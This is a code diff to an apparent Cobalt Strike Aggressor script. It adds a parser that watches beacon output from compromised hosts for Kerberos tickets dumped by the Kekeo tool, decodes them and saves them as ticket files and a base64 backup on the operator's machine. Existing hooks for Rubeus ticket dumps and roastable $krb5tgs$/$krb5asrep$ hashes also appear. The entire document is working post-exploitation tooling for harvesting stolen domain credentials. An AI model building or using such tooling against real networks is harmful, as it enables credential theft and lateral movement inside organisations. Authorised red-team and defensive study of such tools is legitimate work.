@@ -58,6 +58,7 @@ sub trimString {
     $string = replace($string, "\r", "");
     $string = replace($string, "\n", "");
     $string = replace($string, " ", "");
+    $string = replace($string, '\[\+\]Ticketsuccessfullyimported!', "");
     
     return $string;
 }
@@ -529,6 +530,81 @@ sub parseRubeusMonitor {
     }
 }
 
+sub parseKekeo {
+    $bid = $1;
+    $kerbTickets = $2;
+
+    $filenameStartPattern = "Base64 of file : ";
+    $filenameEndPattern = "\r\n====================\r\n";
+    $ticketEndPattern = "\r\n====================\r\n";
+    $counter = 1;
+
+    while ( $counter < 100 ) # avoid infinite loops
+    {
+        try
+        {
+            $ticketStartIndex = indexOf($kerbTickets, $filenameStartPattern);   # find start of ticket metadata
+
+            if ( $ticketStartIndex is $null ) # stop if no ticket found
+            {
+                break;
+            }
+
+            $kerbTickets = substr($kerbTickets, $ticketStartIndex);
+
+            # grab filename
+            $ticketFileName = grabParam($kerbTickets, $filenameStartPattern, $filenameEndPattern);
+            $ticketFileName = replace($ticketFileName, "@", "-");
+            $ticketFileName = replace($ticketFileName, ":", "-");
+            $ticketFileName = replace($ticketFileName, "/", "-");
+            $ticketFileName = replace($ticketFileName, "~", "_");
+
+            $ticketStartIndex = indexOf($kerbTickets, $filenameEndPattern) + strlen($filenameEndPattern); # find start of ticket data
+            if ( $ticketStartIndex is $null ) # sometimes kekeo output comes back in partial chunks (e.g. tgt::asreq at sleep 0), skip if we don't have a complete ticket
+            {
+                break;
+            }
+
+            $ticketEndIndex = indexOf($kerbTickets, $ticketEndPattern, $ticketStartIndex); # find end of ticket data
+            if ( $ticketEndIndex is $null ) 
+            {
+                break;
+            }
+
+            # parse out base64 encoded ticket
+            $ticket = substr($kerbTickets, $ticketStartIndex, $ticketEndIndex);
+
+            # format and decode ticket
+            $ticketFormatted = trimString($ticket);
+            $ticketRaw = base64_decode($ticketFormatted);
+
+            # Save ticket locally to Cobalt Strike operator's host
+            $filename = getDirectory();
+            $filename = $filename . "/KEKEO_" . $ticketFileName;
+            saveBinaryTicket($filename, $ticketRaw);
+
+            # Save backup copy in base64 format to text file
+            $filename = getDirectory() . "/tickets.txt";
+            $ticketText = dstamp(ticks()) . "\nKEKEO_" . $ticketFileName . "\n" . $ticketFormatted . "\n"; 
+            saveText($filename, $ticketText);
+
+            $kerbTickets = substr($kerbTickets, $ticketEndIndex + strlen($ticketEndPattern)); # remove saved ticket from string of all tickets
+            $counter++; 
+        }
+        catch $message 
+        { 
+            btask($bid, "WARNING: Unable to obtain ticket.  Check Script Console for details.");
+            println("WARNING: Unable to obtain ticket\nERROR: $message");
+            println(getStackTrace()); 
+        }
+    }
+    if ( $counter > 1 ) 
+    {
+        btask($bid, "Base64 blob(s) has been saved at: $filename");
+    }
+
+}
+
 on beacon_output {
     $bid = $1;
     $checkRubeusPatternDump = "Action: Dump Kerberos Ticket Data ("; # pattern to search for Rubeus dump module output
@@ -542,6 +618,8 @@ on beacon_output {
     $checkUnknownTicketPattern = "[*] base64(ticket.kirbi):"; # sometimes cobalt strike output is sent in unexpected chunks, epecially at sleep 0.  This pattern is to make sure ticket gets saved even if we don't know which Rubeus module it comes from.
     $checkRubeusRoastPattern1 = "\$krb5tgs\$";
     $checkRubeusRoastPattern2 = "\$krb5asrep\$";
+    $checkKekeoPattern1 = "\r\nBase64 of file : ";
+    $checkKekeoPattern2 = "\r\n====================\r\n";
     $beaconOutput = replace($2, "received output:\n", "");
 
     if ($s4uPattern isin $beaconOutput)
@@ -583,6 +661,10 @@ on beacon_output {
     else if ($checkUnknownTicketPattern isin $beaconOutput)
     {
         parseRubeusCatchAll($bid, $beaconOutput, "UNKNOWN");
+    }
+    else if ($checkKekeoPattern1 isin $beaconOutput && $checkKekeoPattern2 isin $beaconOutput)
+    {
+        parseKekeo($bid, $beaconOutput);
     }
 }
 
